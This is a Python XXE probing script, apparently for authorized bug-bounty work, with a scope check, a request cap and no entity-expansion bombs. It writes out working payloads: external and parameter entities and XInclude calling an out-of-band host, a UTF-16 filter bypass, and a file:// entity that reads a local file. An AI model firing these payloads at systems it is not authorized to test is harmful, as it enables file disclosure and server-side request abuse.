#!/usr/bin/env python3
"""XML parser probing for XXE, entity expansion, XInclude, and UTF-16 bypass.

The XML body is built from a template with {{DOCTYPE}} and {{VALUE}} placeholders.
Probes:
  - internal entity: proves the parser expands entities (safe, no external access)
  - UTF-16 encoded internal entity: checks byte-level filters
  - out-of-band external entity and parameter entity (requires --oob-host you control)
  - XInclude to an out-of-band host (requires --oob-host)
  - local file entity (authorized-only; requires --allow-file-read and a benign path)
Billion-laughs and other resource-expansion payloads are never sent.
Scope gate runs first.

Example:
  xxe_probe.py --target example.com --workspace ~/Documents/bugbounty \
     --url https://example.com/api/import --oob-host abc.oast.example \
     --out artifacts/example.com/xxe.json
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import secrets
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.request

REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "..", ".."))
SCOPE = os.path.join(REPO, "scripts", "scope_check.sh")
MAX_REQUESTS = 20
DEFAULT_TEMPLATE = '<?xml version="1.0"?>{{DOCTYPE}}<root><value>{{VALUE}}</value></root>'


def build(template: str, doctype: str, value: str, encoding: str = "UTF-8") -> bytes:
    doc = template.replace("{{DOCTYPE}}", doctype).replace("{{VALUE}}", value)
    if encoding.upper() == "UTF-16":
        doc = doc.replace('<?xml version="1.0"?>', '<?xml version="1.0" encoding="UTF-16"?>')
        return doc.encode("utf-16")
    return doc.encode("utf-8")


def send(url: str, body: bytes, content_type: str, headers: dict[str, str], timeout: float) -> tuple[int, str]:
    req = urllib.request.Request(url, data=body, method="POST",
                                 headers={"Content-Type": content_type, **headers})
    ctx = ssl.create_default_context()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.status, resp.read(200_000).decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        return err.code, err.read(200_000).decode("utf-8", "replace")
    except (urllib.error.URLError, TimeoutError) as err:
        return 0, str(err)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True)
    ap.add_argument("--workspace")
    ap.add_argument("--url", required=True)
    ap.add_argument("--template-file", help="XML template with {{DOCTYPE}} and {{VALUE}} placeholders")
    ap.add_argument("--content-type", default="application/xml")
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--oob-host", help="host you control for out-of-band checks (DNS and HTTP logs)")
    ap.add_argument("--allow-file-read", action="store_true", help="send a local file entity (needs approval)")
    ap.add_argument("--file-path", default="/etc/hostname", help="benign file for the approved file entity")
    ap.add_argument("--delay", type=float, default=1.0)
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--out")
    args = ap.parse_args()

    res = subprocess.run([SCOPE, args.target] + ([args.workspace] if args.workspace else []),
                         capture_output=True, text=True)
    if res.returncode != 0:
        sys.stderr.write(res.stderr or "scope check failed\n")
        return res.returncode

    template = DEFAULT_TEMPLATE
    if args.template_file:
        with open(args.template_file, encoding="utf-8") as fh:
            template = fh.read()
    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    tag = secrets.token_hex(4)
    sent = 0
    results = []

    def run(label: str, doctype: str, value: str, technique: str, encoding: str = "UTF-8"):
        nonlocal sent
        body = build(template, doctype, value, encoding)
        ctype = args.content_type + (";charset=UTF-16" if encoding == "UTF-16" else "")
        status, text = send(args.url, body, ctype, headers, args.timeout)
        sent += 1
        time.sleep(args.delay)
        results.append({"probe": label, "technique": technique, "status": status, "length": len(text),
                        "sha": hashlib.sha256(text.encode()).hexdigest()[:16], "body_excerpt": text[:160],
                        "marker_in_response": None, "marker": None})
        return status, text

    base_status, base_text = run("baseline (plain value)", "", "baseline-" + tag, "baseline")
    base_sha = hashlib.sha256(base_text.encode()).hexdigest()[:16]

    ent_marker = "EXP" + tag
    ent_doctype = f'<!DOCTYPE root [<!ENTITY e "{ent_marker}">]>'
    _, t1 = run("internal entity expansion", ent_doctype, "&e;", "entity-expansion")
    results[-1]["marker"] = ent_marker
    results[-1]["marker_in_response"] = ent_marker in t1
    entity_expanded = ent_marker in t1

    u16_marker = "U16" + tag
    _, t2 = run("UTF-16 encoded internal entity", f'<!DOCTYPE root [<!ENTITY e "{u16_marker}">]>', "&e;",
                "utf16-bypass", encoding="UTF-16")
    results[-1]["marker"] = u16_marker
    results[-1]["marker_in_response"] = u16_marker in t2
    utf16_expanded = u16_marker in t2

    oob_sent = []
    if args.oob_host and sent < MAX_REQUESTS:
        tok = "x" + tag
        run("out-of-band external entity", f'<!DOCTYPE root [<!ENTITY e SYSTEM "http://{args.oob_host}/ext-{tok}">]>',
            "&e;", "oob-external-entity")
        oob_sent.append(f"ext-{tok}")
    if args.oob_host and sent < MAX_REQUESTS:
        tok = "p" + tag
        run("out-of-band parameter entity", f'<!DOCTYPE root [<!ENTITY % p SYSTEM "http://{args.oob_host}/pe-{tok}.dtd"> %p;]>',
            "x", "oob-parameter-entity")
        oob_sent.append(f"pe-{tok}")
    if args.oob_host and sent < MAX_REQUESTS:
        tok = "xi" + tag
        body = ('<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude">'
                f'<value><xi:include parse="text" href="http://{args.oob_host}/{tok}"/></value></root>').encode()
        s3, t3 = send(args.url, body, args.content_type, headers, args.timeout)
        sent += 1
        time.sleep(args.delay)
        results.append({"probe": "XInclude to out-of-band host", "technique": "xinclude-oob", "status": s3,
                        "length": len(t3), "sha": hashlib.sha256(t3.encode()).hexdigest()[:16],
                        "body_excerpt": t3[:160], "marker": tok, "marker_in_response": None})
        oob_sent.append(tok)

    file_changed = None
    if args.allow_file_read and sent < MAX_REQUESTS:
        _, t4 = run("local file entity (approved)", f'<!DOCTYPE root [<!ENTITY e SYSTEM "file://{args.file_path}">]>',
                    "&e;", "file-entity-approved")
        file_changed = hashlib.sha256(t4.encode()).hexdigest()[:16] != base_sha
        results[-1]["note"] = "response differs from baseline; record the content only if it is non-sensitive"

    if entity_expanded:
        verdict = "xml-entity-expansion-confirmed"
    elif utf16_expanded:
        verdict = "utf16-entity-expansion-confirmed"
    elif oob_sent:
        verdict = "oob-probes-sent: check the out-of-band host logs"
    else:
        verdict = "not-indicated"

    report = {"target": args.target, "url": args.url, "requests_sent": sent,
              "entity_expanded": entity_expanded, "utf16_expanded": utf16_expanded,
              "oob_tokens": oob_sent, "file_entity_response_changed": file_changed,
              "verdict": verdict, "results": results,
              "not_sent": ["billion laughs and other resource-expansion payloads (never sent)"],
              "next_step": "Check the out-of-band host for the tokens listed in oob_tokens. Report the entity evidence. Do not read files beyond the approved benign path."}
    text = json.dumps(report, indent=2)
    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write(text + "\n")
    print(text)
    return 0


if __name__ == "__main__":
    sys.exit(main())
